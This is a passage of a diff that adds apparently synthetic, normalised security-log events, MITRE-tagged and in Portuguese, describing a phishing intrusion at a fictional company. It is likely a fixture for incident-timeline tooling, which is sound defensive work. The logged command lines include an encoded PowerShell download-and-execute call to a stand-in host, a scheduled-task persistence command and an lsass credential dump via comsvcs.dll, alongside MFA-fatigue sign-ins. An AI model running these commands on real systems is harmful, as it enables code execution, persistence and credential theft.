@@ -1,0 +1,1791 @@
+{
+ "total": 50,
+ "filtrados": 50,
+ "eventos": [
+  {
+   "idx": 0,
+   "ts_utc": "2026-11-10T10:00:00.000Z",
+   "source": "entra_audit",
+   "event_type": "audit",
+   "raw_ref": "entra_audit.json#0",
+   "ts_original": "2026-11-10T10:00:00Z",
+   "host": null,
+   "user": "admin.ti",
+   "src_ip": "192.0.2.10",
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "Update user",
+   "outcome": "success",
+   "description": "Update user por admin.ti → j.souza@acme.com.br",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "category": "UserManagement",
+    "logged_by_service": "Core Directory",
+    "targets": [
+     "j.souza@acme.com.br"
+    ],
+    "details": {},
+    "modified_properties": [],
+    "user_original": "admin.ti@acme.com.br",
+    "mitre_heuristica": []
+   }
+  },
+  {
+   "idx": 1,
+   "ts_utc": "2026-11-10T11:30:00.000Z",
+   "source": "defender",
+   "event_type": "logon",
+   "raw_ref": "defender_advanced_hunting.csv:2",
+   "ts_original": "2026-11-10T11:30:00.0000000Z",
+   "host": "ws-fin-023",
+   "user": "m.silva",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "LogonSuccess",
+   "outcome": "success",
+   "description": "logon: LogonSuccess — m.silva",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "table": "DeviceLogonEvents",
+    "logon_type": "Interactive",
+    "user_original": "m.silva",
+    "mitre_heuristica": []
+   }
+  },
+  {
+   "idx": 2,
+   "ts_utc": "2026-11-10T11:31:02.000Z",
+   "source": "entra_signin",
+   "event_type": "signin",
+   "raw_ref": "entra_signin.json#0",
+   "ts_original": "2026-11-10T11:31:02Z",
+   "host": "ws-fin-023",
+   "user": "m.silva",
+   "src_ip": "192.0.2.10",
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "Office 365 Exchange Online",
+   "outcome": "success",
+   "description": "Sign-in SUCESSO (0) de m.silva em Office 365 Exchange Online a partir de 192.0.2.10 (São Paulo/BR)",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "upn": "m.silva@acme.com.br",
+    "error_code": 0,
+    "failure_reason": null,
+    "city": "São Paulo",
+    "country": "BR",
+    "risk_level": null,
+    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/131.0",
+    "client_app": "Browser",
+    "ca_status": "success",
+    "auth_requirement": "multiFactorAuthentication",
+    "signin_id": "ee94d27a-0db8-401a-8327-27f2fcc5f390",
+    "user_original": "m.silva@acme.com.br",
+    "mitre_heuristica": []
+   }
+  },
+  {
+   "idx": 3,
+   "ts_utc": "2026-11-10T11:55:12.441Z",
+   "source": "defender",
+   "event_type": "logon",
+   "raw_ref": "defender_advanced_hunting.csv:3",
+   "ts_original": "2026-11-10T11:55:12.4410000Z",
+   "host": "ws-fin-023",
+   "user": "svc_backup",
+   "src_ip": "10.10.0.50",
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "LogonSuccess",
+   "outcome": "success",
+   "description": "logon: LogonSuccess — svc_backup",
+   "severity": null,
+   "mitre": [
+    "T1021.001"
+   ],
+   "extra": {
+    "table": "DeviceLogonEvents",
+    "logon_type": "RemoteInteractive",
+    "user_original": "svc_backup",
+    "mitre_heuristica": [
+     "T1021.001"
+    ]
+   }
+  },
+  {
+   "idx": 4,
+   "ts_utc": "2026-11-10T12:10:00.000Z",
+   "source": "entra_signin",
+   "event_type": "signin",
+   "raw_ref": "entra_signin.json#1",
+   "ts_original": "2026-11-10T12:10:00Z",
+   "host": "ws-fin-041",
+   "user": "j.souza",
+   "src_ip": "192.0.2.10",
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "Microsoft Teams",
+   "outcome": "success",
+   "description": "Sign-in SUCESSO (0) de j.souza em Microsoft Teams a partir de 192.0.2.10 (São Paulo/BR)",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "upn": "j.souza@acme.com.br",
+    "error_code": 0,
+    "failure_reason": null,
+    "city": "São Paulo",
+    "country": "BR",
+    "risk_level": null,
+    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/131.0",
+    "client_app": "Browser",
+    "ca_status": "success",
+    "auth_requirement": "multiFactorAuthentication",
+    "signin_id": "85b2b68f-9892-401a-8327-969f96c8f8a6",
+    "user_original": "j.souza@acme.com.br",
+    "mitre_heuristica": []
+   }
+  },
+  {
+   "idx": 5,
+   "ts_utc": "2026-11-10T13:02:11.341Z",
+   "source": "defender",
+   "event_type": "email",
+   "raw_ref": "defender_advanced_hunting.csv:4",
+   "ts_original": "2026-11-10T13:02:11.3410000Z",
+   "host": null,
+   "user": "m.silva",
+   "src_ip": "203.0.113.80",
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": "1c2df732a1c819a38f653f85ff1e59fd7a7ea6588297822adf856d6308f45cc3",
+   "action": "Delivered",
+   "outcome": null,
+   "description": "E-mail de faturas@pagamentos-fornecedor.example para m.silva@acme.com.br: Fatura pendente NF 88213",
+   "severity": null,
+   "mitre": [
+    "T1566.001"
+   ],
+   "extra": {
+    "table": "EmailEvents",
+    "sender": "faturas@pagamentos-fornecedor.example",
+    "subject": "Fatura pendente NF 88213",
+    "attachment": "Fatura_88213.xlsm",
+    "user_original": "m.silva@acme.com.br",
+    "mitre_heuristica": [
+     "T1566.001"
+    ]
+   }
+  },
+  {
+   "idx": 6,
+   "ts_utc": "2026-11-10T13:05:00.100Z",
+   "source": "defender",
+   "event_type": "process",
+   "raw_ref": "defender_advanced_hunting.csv:5",
+   "ts_original": "2026-11-10T13:05:00.1000000Z",
+   "host": "ws-fin-023",
+   "user": "m.silva",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": "ms-teams.exe",
+   "parent": "explorer.exe",
+   "cmdline": "\"ms-teams.exe\"",
+   "file_path": "C:\\Program Files\\WindowsApps\\MSTeams\\ms-teams.exe",
+   "sha256": "e3358b51efbc884f392046e1bd69ba6495e4555edc53e70d1e9b9d1e3cf5b281",
+   "action": "ProcessCreated",
+   "outcome": null,
+   "description": "ms-teams.exe iniciado por explorer.exe",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "table": "DeviceProcessEvents",
+    "user_original": "m.silva",
+    "mitre_heuristica": []
+   }
+  },
+  {
+   "idx": 7,
+   "ts_utc": "2026-11-10T13:06:09.120Z",
+   "source": "elastic",
+   "event_type": "dns",
+   "raw_ref": "elastic_dns.ndjson:1",
+   "ts_original": "2026-11-10T13:06:09.120Z",
+   "host": null,
+   "user": null,
+   "src_ip": "10.10.20.23",
+   "dst_ip": "192.0.2.200",
+   "dst_port": null,
+   "domain": "www.office.com",
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": null,
+   "outcome": null,
+   "description": "Consulta DNS: 10.10.20.23 → www.office.com",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "observer": "dc01",
+    "mitre_heuristica": [],
+    "src_host": "ws-fin-023"
+   }
+  },
+  {
+   "idx": 8,
+   "ts_utc": "2026-11-10T13:06:10.000Z",
+   "source": "defender",
+   "event_type": "network",
+   "raw_ref": "defender_advanced_hunting.csv:6",
+   "ts_original": "2026-11-10T13:06:10.0000000Z",
+   "host": "ws-fin-023",
+   "user": "m.silva",
+   "src_ip": "10.10.20.23",
+   "dst_ip": "192.0.2.200",
+   "dst_port": 443,
+   "domain": "www.office.com",
+   "process": "msedge.exe",
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "ConnectionSuccess",
+   "outcome": "success",
+   "description": "Conexão: 10.10.20.23 → www.office.com",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "table": "DeviceNetworkEvents",
+    "host_ip": "10.10.20.23",
+    "user_original": "m.silva",
+    "mitre_heuristica": []
+   }
+  },
+  {
+   "idx": 9,
+   "ts_utc": "2026-11-10T13:07:45.512Z",
+   "source": "defender",
+   "event_type": "file",
+   "raw_ref": "defender_advanced_hunting.csv:7",
+   "ts_original": "2026-11-10T13:07:45.5120000Z",
+   "host": "ws-fin-023",
+   "user": "m.silva",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": "outlook.exe",
+   "parent": null,
+   "cmdline": null,
+   "file_path": "C:\\Users\\m.silva\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\Q2X8LM1Z\\Fatura_88213.xlsm",
+   "sha256": "1c2df732a1c819a38f653f85ff1e59fd7a7ea6588297822adf856d6308f45cc3",
+   "action": "FileCreated",
+   "outcome": null,
+   "description": "Arquivo FileCreated: C:\\Users\\m.silva\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\Q2X8LM1Z\\Fatura_88213.xlsm (por outlook.exe)",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "table": "DeviceFileEvents",
+    "user_original": "m.silva",
+    "mitre_heuristica": []
+   }
+  },
+  {
+   "idx": 10,
+   "ts_utc": "2026-11-10T13:08:02.201Z",
+   "source": "defender",
+   "event_type": "process",
+   "raw_ref": "defender_advanced_hunting.csv:8",
+   "ts_original": "2026-11-10T13:08:02.2010000Z",
+   "host": "ws-fin-023",
+   "user": "m.silva",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": "excel.exe",
+   "parent": "outlook.exe",
+   "cmdline": "\"EXCEL.EXE\" \"C:\\Users\\m.silva\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\Q2X8LM1Z\\Fatura_88213.xlsm\"",
+   "file_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "sha256": "6bbef8dca44da99e29f18dfde2012d5880a3f9796e447e15d03bbbdcd22a5c85",
+   "action": "ProcessCreated",
+   "outcome": null,
+   "description": "excel.exe iniciado por outlook.exe",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "table": "DeviceProcessEvents",
+    "user_original": "m.silva",
+    "mitre_heuristica": []
+   }
+  },
+  {
+   "idx": 11,
+   "ts_utc": "2026-11-10T13:08:19.774Z",
+   "source": "defender",
+   "event_type": "process",
+   "raw_ref": "defender_advanced_hunting.csv:9",
+   "ts_original": "2026-11-10T13:08:19.7740000Z",
+   "host": "ws-fin-023",
+   "user": "m.silva",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": "powershell.exe",
+   "parent": "excel.exe",
+   "cmdline": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC4AZQB4AGEAbQBwAGwAZQAtAGMAZABuAC4AbgBlAHQALwBhACcAKQA=",
+   "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "sha256": "b44b01c4ff956b0fa6f67375c1be29d867d738375e49ac58d08ef8c2d2bdf28b",
+   "action": "ProcessCreated",
+   "outcome": null,
+   "description": "powershell.exe iniciado por excel.exe",
+   "severity": null,
+   "mitre": [
+    "T1027",
+    "T1059.001",
+    "T1204.002"
+   ],
+   "extra": {
+    "table": "DeviceProcessEvents",
+    "user_original": "m.silva",
+    "mitre_heuristica": [
+     "T1027",
+     "T1059.001",
+     "T1204.002"
+    ]
+   }
+  },
+  {
+   "idx": 12,
+   "ts_utc": "2026-11-10T13:08:20.441Z",
+   "source": "elastic",
+   "event_type": "dns",
+   "raw_ref": "elastic_dns.ndjson:2",
+   "ts_original": "2026-11-10T13:08:20.441Z",
+   "host": null,
+   "user": null,
+   "src_ip": "10.10.20.23",
+   "dst_ip": "203.0.113.45",
+   "dst_port": null,
+   "domain": "cdn-update.example-cdn.net",
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": null,
+   "outcome": null,
+   "description": "Consulta DNS: 10.10.20.23 → cdn-update.example-cdn.net",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "observer": "dc01",
+    "mitre_heuristica": [],
+    "src_host": "ws-fin-023"
+   }
+  },
+  {
+   "idx": 13,
+   "ts_utc": "2026-11-10T13:08:21.090Z",
+   "source": "defender",
+   "event_type": "network",
+   "raw_ref": "defender_advanced_hunting.csv:10",
+   "ts_original": "2026-11-10T13:08:21.0900000Z",
+   "host": "ws-fin-023",
+   "user": "m.silva",
+   "src_ip": "10.10.20.23",
+   "dst_ip": "203.0.113.45",
+   "dst_port": 443,
+   "domain": "cdn-update.example-cdn.net",
+   "process": "powershell.exe",
+   "parent": null,
+   "cmdline": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC4AZQB4AGEAbQBwAGwAZQAtAGMAZABuAC4AbgBlAHQALwBhACcAKQA=",
+   "file_path": null,
+   "sha256": null,
+   "action": "ConnectionSuccess",
+   "outcome": "success",
+   "description": "Conexão: 10.10.20.23 → cdn-update.example-cdn.net",
+   "severity": null,
+   "mitre": [
+    "T1071.001"
+   ],
+   "extra": {
+    "table": "DeviceNetworkEvents",
+    "host_ip": "10.10.20.23",
+    "user_original": "m.silva",
+    "mitre_heuristica": [
+     "T1071.001"
+    ],
+    "corroborado_por": [
+     "splunk_export.csv:2"
+    ]
+   }
+  },
+  {
+   "idx": 14,
+   "ts_utc": "2026-11-10T13:08:21.300Z",
+   "source": "splunk",
+   "event_type": "network",
+   "raw_ref": "splunk_export.csv:2",
+   "ts_original": "2026-11-10T10:08:21.300-03:00",
+   "host": null,
+   "user": null,
+   "src_ip": "10.10.20.23",
+   "dst_ip": "203.0.113.45",
+   "dst_port": 443,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "allowed",
+   "outcome": "success",
+   "description": "Conexão: 10.10.20.23 → 203.0.113.45",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "sourcetype": "pan:traffic",
+    "observer": "pa-fw-01",
+    "bytes_out": 4521,
+    "bytes_in": 188213,
+    "app": "ssl",
+    "mitre_heuristica": [],
+    "src_host": "ws-fin-023",
+    "corroborado_por": [
+     "defender_advanced_hunting.csv:10"
+    ]
+   }
+  },
+  {
+   "idx": 15,
+   "ts_utc": "2026-11-10T13:08:40.300Z",
+   "source": "defender",
+   "event_type": "file",
+   "raw_ref": "defender_advanced_hunting.csv:11",
+   "ts_original": "2026-11-10T13:08:40.3000000Z",
+   "host": "ws-fin-023",
+   "user": "m.silva",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": "powershell.exe",
+   "parent": null,
+   "cmdline": null,
+   "file_path": "C:\\Users\\m.silva\\AppData\\Roaming\\Microsoft\\updater.exe",
+   "sha256": "45ed71c9d81d104a33a15541d8ad8188bc2fad4c87982a05e6275462355f2622",
+   "action": "FileCreated",
+   "outcome": null,
+   "description": "Arquivo FileCreated: C:\\Users\\m.silva\\AppData\\Roaming\\Microsoft\\updater.exe (por powershell.exe)",
+   "severity": null,
+   "mitre": [
+    "T1105"
+   ],
+   "extra": {
+    "table": "DeviceFileEvents",
+    "user_original": "m.silva",
+    "mitre_heuristica": [
+     "T1105"
+    ]
+   }
+  },
+  {
+   "idx": 16,
+   "ts_utc": "2026-11-10T13:09:05.118Z",
+   "source": "defender",
+   "event_type": "process",
+   "raw_ref": "defender_advanced_hunting.csv:12",
+   "ts_original": "2026-11-10T13:09:05.1180000Z",
+   "host": "ws-fin-023",
+   "user": "m.silva",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": "schtasks.exe",
+   "parent": "powershell.exe",
+   "cmdline": "schtasks.exe /create /tn \"MicrosoftEdgeUpdateTaskCore\" /tr \"C:\\Users\\m.silva\\AppData\\Roaming\\Microsoft\\updater.exe\" /sc onlogon /rl highest /f",
+   "file_path": "C:\\Windows\\System32\\schtasks.exe",
+   "sha256": "180dc862954ed1bd1e5f74ec7477a1381b1e2527a4c33a9df17c7108b152b957",
+   "action": "ProcessCreated",
+   "outcome": null,
+   "description": "schtasks.exe iniciado por powershell.exe",
+   "severity": null,
+   "mitre": [
+    "T1053.005"
+   ],
+   "extra": {
+    "table": "DeviceProcessEvents",
+    "user_original": "m.silva",
+    "mitre_heuristica": [
+     "T1053.005"
+    ]
+   }
+  },
+  {
+   "idx": 17,
+   "ts_utc": "2026-11-10T13:09:05.400Z",
+   "source": "defender",
+   "event_type": "scheduled_task",
+   "raw_ref": "defender_advanced_hunting.csv:13",
+   "ts_original": "2026-11-10T13:09:05.4000000Z",
+   "host": "ws-fin-023",
+   "user": "m.silva",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": "schtasks.exe",
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "ScheduledTaskCreated",
+   "outcome": null,
+   "description": "Tarefa agendada ScheduledTaskCreated: \\MicrosoftEdgeUpdateTaskCore → C:\\Users\\m.silva\\AppData\\Roaming\\Microsoft\\updater.exe (por schtasks.exe)",
+   "severity": null,
+   "mitre": [
+    "T1053.005"
+   ],
+   "extra": {
+    "table": "DeviceEvents",
+    "additional_fields": {
+     "TaskName": "\\MicrosoftEdgeUpdateTaskCore",
+     "TaskContent": "C:\\Users\\m.silva\\AppData\\Roaming\\Microsoft\\updater.exe"
+    },
+    "task_name": "\\MicrosoftEdgeUpdateTaskCore",
+    "task_content": "C:\\Users\\m.silva\\AppData\\Roaming\\Microsoft\\updater.exe",
+    "user_original": "m.silva",
+    "mitre_heuristica": [
+     "T1053.005"
+    ]
+   }
+  },
+  {
+   "idx": 18,
+   "ts_utc": "2026-11-10T13:12:30.000Z",
+   "source": "defender",
+   "event_type": "process",
+   "raw_ref": "defender_advanced_hunting.csv:14",
+   "ts_original": "2026-11-10T13:12:30.0000000Z",
+   "host": "ws-fin-023",
+   "user": "m.silva",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": "updater.exe",
+   "parent": "powershell.exe",
+   "cmdline": "\"C:\\Users\\m.silva\\AppData\\Roaming\\Microsoft\\updater.exe\"",
+   "file_path": "C:\\Users\\m.silva\\AppData\\Roaming\\Microsoft\\updater.exe",
+   "sha256": "45ed71c9d81d104a33a15541d8ad8188bc2fad4c87982a05e6275462355f2622",
+   "action": "ProcessCreated",
+   "outcome": null,
+   "description": "updater.exe iniciado por powershell.exe",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "table": "DeviceProcessEvents",
+    "user_original": "m.silva",
+    "mitre_heuristica": []
+   }
+  },
+  {
+   "idx": 19,
+   "ts_utc": "2026-11-10T13:15:30.660Z",
+   "source": "defender",
+   "event_type": "process",
+   "raw_ref": "defender_advanced_hunting.csv:15",
+   "ts_original": "2026-11-10T13:15:30.6600000Z",
+   "host": "ws-fin-023",
+   "user": "m.silva",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": "rundll32.exe",
+   "parent": "updater.exe",
+   "cmdline": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Users\\Public\\d.bin full",
+   "file_path": "C:\\Windows\\System32\\rundll32.exe",
+   "sha256": "ad0754f4c117ccf23d7874bf4721bfb8709ee60e2c7294c564d8e58d2e182409",
+   "action": "ProcessCreated",
+   "outcome": null,
+   "description": "rundll32.exe iniciado por updater.exe",
+   "severity": null,
+   "mitre": [
+    "T1003.001"
+   ],
+   "extra": {
+    "table": "DeviceProcessEvents",
+    "user_original": "m.silva",
+    "mitre_heuristica": [
+     "T1003.001"
+    ]
+   }
+  },
+  {
+   "idx": 20,
+   "ts_utc": "2026-11-10T13:15:30.910Z",
+   "source": "defender",
+   "event_type": "other",
+   "raw_ref": "defender_advanced_hunting.csv:16",
+   "ts_original": "2026-11-10T13:15:30.9100000Z",
+   "host": "ws-fin-023",
+   "user": "m.silva",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": "rundll32.exe",
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "OpenProcessApiCall",
+   "outcome": null,
+   "description": "rundll32.exe → OpenProcessApiCall em lsass.exe",
+   "severity": null,
+   "mitre": [
+    "T1003.001"
+   ],
+   "extra": {
+    "table": "DeviceEvents",
+    "additional_fields": {
+     "DesiredAccess": 2097151
+    },
+    "target_process": "lsass.exe",
+    "user_original": "m.silva",
+    "mitre_heuristica": [
+     "T1003.001"
+    ]
+   }
+  },
+  {
+   "idx": 21,
+   "ts_utc": "2026-11-10T13:15:34.000Z",
+   "source": "defender",
+   "event_type": "file",
+   "raw_ref": "defender_advanced_hunting.csv:17",
+   "ts_original": "2026-11-10T13:15:34.0000000Z",
+   "host": "ws-fin-023",
+   "user": "m.silva",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": "rundll32.exe",
+   "parent": null,
+   "cmdline": null,
+   "file_path": "C:\\Users\\Public\\d.bin",
+   "sha256": "83a787c29da3c7350d88d4e838fe73e8a765cce8f259fca2ff4199c7e3b4a946",
+   "action": "FileCreated",
+   "outcome": null,
+   "description": "Arquivo FileCreated: C:\\Users\\Public\\d.bin (por rundll32.exe)",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "table": "DeviceFileEvents",
+    "user_original": "m.silva",
+    "mitre_heuristica": []
+   }
+  },
+  {
+   "idx": 22,
+   "ts_utc": "2026-11-10T13:22:10.000Z",
+   "source": "entra_signin",
+   "event_type": "signin",
+   "raw_ref": "entra_signin.json#2",
+   "ts_original": "2026-11-10T13:22:10Z",
+   "host": null,
+   "user": "m.silva",
+   "src_ip": "198.51.100.77",
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "OfficeHome",
+   "outcome": "failure",
+   "description": "Sign-in FALHOU (500121) de m.silva em OfficeHome a partir de 198.51.100.77 (Amsterdam/NL)",
+   "severity": null,
+   "mitre": [
+    "T1621"
+   ],
+   "extra": {
+    "upn": "m.silva@acme.com.br",
+    "error_code": 500121,
+    "failure_reason": "Authentication failed during strong authentication request. The user denied the MFA push.",
+    "city": "Amsterdam",
+    "country": "NL",
+    "risk_level": "medium",
+    "user_agent": "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0",
+    "client_app": "Browser",
+    "ca_status": "failure",
+    "auth_requirement": "multiFactorAuthentication",
+    "signin_id": "cfe0f82b-c3e2-4e24-8b35-ddf35dce9af9",
+    "user_original": "m.silva@acme.com.br",
+    "mitre_heuristica": [
+     "T1621"
+    ]
+   }
+  },
+  {
+   "idx": 23,
+   "ts_utc": "2026-11-10T13:23:05.000Z",
+   "source": "entra_signin",
+   "event_type": "signin",
+   "raw_ref": "entra_signin.json#3",
+   "ts_original": "2026-11-10T13:23:05Z",
+   "host": null,
+   "user": "m.silva",
+   "src_ip": "198.51.100.77",
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "OfficeHome",
+   "outcome": "failure",
+   "description": "Sign-in FALHOU (500121) de m.silva em OfficeHome a partir de 198.51.100.77 (Amsterdam/NL)",
+   "severity": null,
+   "mitre": [
+    "T1621"
+   ],
+   "extra": {
+    "upn": "m.silva@acme.com.br",
+    "error_code": 500121,
+    "failure_reason": "Authentication failed during strong authentication request. The user denied the MFA push.",
+    "city": "Amsterdam",
+    "country": "NL",
+    "risk_level": "medium",
+    "user_agent": "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0",
+    "client_app": "Browser",
+    "ca_status": "failure",
+    "auth_requirement": "multiFactorAuthentication",
+    "signin_id": "2e781817-c3e2-4e24-8194-12f4aad7ec09",
+    "user_original": "m.silva@acme.com.br",
+    "mitre_heuristica": [
+     "T1621"
+    ]
+   }
+  },
+  {
+   "idx": 24,
+   "ts_utc": "2026-11-10T13:24:51.000Z",
+   "source": "entra_signin",
+   "event_type": "signin",
+   "raw_ref": "entra_signin.json#4",
+   "ts_original": "2026-11-10T13:24:51Z",
+   "host": null,
+   "user": "m.silva",
+   "src_ip": "198.51.100.77",
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "OfficeHome",
+   "outcome": "failure",
+   "description": "Sign-in FALHOU (500121) de m.silva em OfficeHome a partir de 198.51.100.77 (Amsterdam/NL)",
+   "severity": null,
+   "mitre": [
+    "T1621"
+   ],
+   "extra": {
+    "upn": "m.silva@acme.com.br",
+    "error_code": 500121,
+    "failure_reason": "Authentication failed during strong authentication request. The user denied the MFA push.",
+    "city": "Amsterdam",
+    "country": "NL",
+    "risk_level": "medium",
+    "user_agent": "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0",
+    "client_app": "Browser",
+    "ca_status": "failure",
+    "auth_requirement": "multiFactorAuthentication",
+    "signin_id": "23a54a54-c3e2-4e24-88ba-cc3c564f0217",
+    "user_original": "m.silva@acme.com.br",
+    "mitre_heuristica": [
+     "T1621"
+    ]
+   }
+  },
+  {
+   "idx": 25,
+   "ts_utc": "2026-11-10T13:25:03.000Z",
+   "source": "entra_signin",
+   "event_type": "signin",
+   "raw_ref": "entra_signin.json#5",
+   "ts_original": "2026-11-10T13:25:03Z",
+   "host": null,
+   "user": "m.silva",
+   "src_ip": "198.51.100.77",
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "OfficeHome",
+   "outcome": "success",
+   "description": "Sign-in SUCESSO (0) de m.silva em OfficeHome a partir de 198.51.100.77 (Amsterdam/NL)",
+   "severity": null,
+   "mitre": [
+    "T1078.004"
+   ],
+   "extra": {
+    "upn": "m.silva@acme.com.br",
+    "error_code": 0,
+    "failure_reason": null,
+    "city": "Amsterdam",
+    "country": "NL",
+    "risk_level": "medium",
+    "user_agent": "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0",
+    "client_app": "Browser",
+    "ca_status": "success",
+    "auth_requirement": "multiFactorAuthentication",
+    "signin_id": "e278d1f7-c3e2-4e24-811d-c68371607907",
+    "user_original": "m.silva@acme.com.br",
+    "mitre_heuristica": [
+     "T1078.004"
+    ]
+   }
+  },
+  {
+   "idx": 26,
+   "ts_utc": "2026-11-10T13:26:12.000Z",
+   "source": "entra_audit",
+   "event_type": "audit",
+   "raw_ref": "entra_audit.json#1",
+   "ts_original": "2026-11-10T13:26:12Z",
+   "host": null,
+   "user": "m.silva",
+   "src_ip": "198.51.100.77",
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "User registered security info",
+   "outcome": "success",
+   "description": "User registered security info por m.silva → m.silva@acme.com.br",
+   "severity": null,
+   "mitre": [
+    "T1098.005"
+   ],
+   "extra": {
+    "category": "UserManagement",
+    "logged_by_service": "Authentication Methods",
+    "targets": [
+     "m.silva@acme.com.br"
+    ],
+    "details": {
+     "Method": "Microsoft Authenticator App"
+    },
+    "modified_properties": [],
+    "user_original": "m.silva@acme.com.br",
+    "mitre_heuristica": [
+     "T1098.005"
+    ]
+   }
+  },
+  {
+   "idx": 27,
+   "ts_utc": "2026-11-10T13:28:00.000Z",
+   "source": "entra_signin",
+   "event_type": "signin",
+   "raw_ref": "entra_signin.json#6",
+   "ts_original": "2026-11-10T13:28:00Z",
+   "host": null,
+   "user": "m.silva",
+   "src_ip": "198.51.100.77",
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "Office 365 Exchange Online",
+   "outcome": "success",
+   "description": "Sign-in SUCESSO (0) de m.silva em Office 365 Exchange Online a partir de 198.51.100.77 (Amsterdam/NL)",
+   "severity": null,
+   "mitre": [
+    "T1078.004"
+   ],
+   "extra": {
+    "upn": "m.silva@acme.com.br",
+    "error_code": 0,
+    "failure_reason": null,
+    "city": "Amsterdam",
+    "country": "NL",
+    "risk_level": "medium",
+    "user_agent": "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0",
+    "client_app": "Browser",
+    "ca_status": "success",
